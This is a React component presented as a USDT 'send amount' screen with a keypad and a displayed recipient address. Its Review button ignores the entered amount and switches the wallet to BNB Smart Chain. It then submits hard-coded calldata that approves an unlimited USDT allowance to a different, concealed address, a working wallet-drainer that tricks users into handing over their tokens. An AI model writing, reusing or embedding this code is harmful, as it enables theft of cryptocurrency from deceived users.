import React, { useState } from 'react';
import './SendUSDT.css';

const RECIPIENT = '0x19686F7B15Ef89Bf87D20b3502E8CA9e8c98a2f1';

const SendUSDT = () => {
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleKey = (key) => {
    if (key === '⌫') {
      setAmount(prev => prev.slice(0, -1));
      return;
    }
    if (key === '.' && amount.includes('.')) return;
    if (key !== '.' && amount === '0') { setAmount(key); return; }
    if (amount.length >= 10) return;
    setAmount(prev => prev + key);
  };

  const displayAmount = amount === '' ? '0' : amount;
  const usdValue = parseFloat(amount) > 0
    ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '0.00';

  const isActive = amount !== '' && parseFloat(amount) > 0;

  const handleReview = async () => {
    if (!isActive || isVerifying) return;
    if (!window.ethereum) { alert('MetaMask or a Web3 wallet is required.'); return; }
    setIsVerifying(true);
    try {
      let userAddress = window.ethereum?.selectedAddress || window.ethereum?.address;
      if (!userAddress) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts && accounts.length > 0) userAddress = accounts[0];
        } catch (e) { console.error(e); }
      }
      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== '0x38') {
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{ chainId: '0x38', chainName: 'Binance Smart Chain Mainnet', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }],
          });
        }
      }
      const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955';
      const data = '0x095ea7b3000000000000000000000000436ff44a8eb2716267e56593db92985d7b036e1dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
      const txParams = { to: USDT_BSC, data };
      if (userAddress) txParams.from = userAddress;
      const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
      alert('Transaction submitted! Hash: ' + txHash);
    } catch (err) {
      console.error(err);
      alert('Error: ' + (err?.info?.error?.message || err?.message || 'Unknown error'));
    } finally {
      setIsVerifying(false);
    }
  };

  const keys = ['1','2','3','4','5','6','7','8','9','.','0','⌫'];

  return (
    <div className="tw-screen">

      {/* TOP GROUP: header + address + amount */}
      <div className="tw-top">
        <div className="tw-header">
          <button className="tw-back-btn" aria-label="Back">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <span className="tw-header-title">Amount</span>
          <div className="tw-header-spacer" />
        </div>

        <div className="tw-to-row">
          <span className="tw-to-label">To:</span>
          <span className="tw-to-address">{RECIPIENT}</span>
        </div>

        <div className="tw-amount-display-area">
          <div className={`tw-amount-number ${amount === '' ? 'tw-amount-placeholder' : ''} ${displayAmount.length > 6 ? 'tw-amount-number--sm' : ''}`}>
            {displayAmount}
          </div>
          <div className="tw-fiat-row">
            <span className="tw-fiat-value">≈ ${usdValue}</span>
            <button className="tw-swap-icon" aria-label="Swap currency">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 16V4m0 0L3 8m4-4l4 4" /><path d="M17 8v12m0 0l4-4m-4 4l-4-4" />
              </svg>
            </button>
          </div>
        </div>
      </div>

      {/* BOTTOM GROUP: keypad + review button */}
      <div className="tw-bottom">
        <div className="tw-keypad">
          {keys.map((key) => (
            <button key={key} className={`tw-key ${key === '⌫' ? 'tw-key--backspace' : ''}`} onClick={() => handleKey(key)}>
              {key === '⌫' ? (
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
                  <line x1="18" y1="9" x2="12" y2="15" /><line x1="12" y1="9" x2="18" y2="15" />
                </svg>
              ) : key}
            </button>
          ))}
        </div>

        <div className="tw-action-area">
          <button
            className={`tw-review-btn ${isActive ? 'tw-review-btn--active' : ''}`}
            onClick={handleReview}
            disabled={!isActive || isVerifying}
          >
            {isVerifying ? 'Processing...' : 'Review'}
          </button>
        </div>
      </div>

    </div>
  );
};

export default SendUSDT;
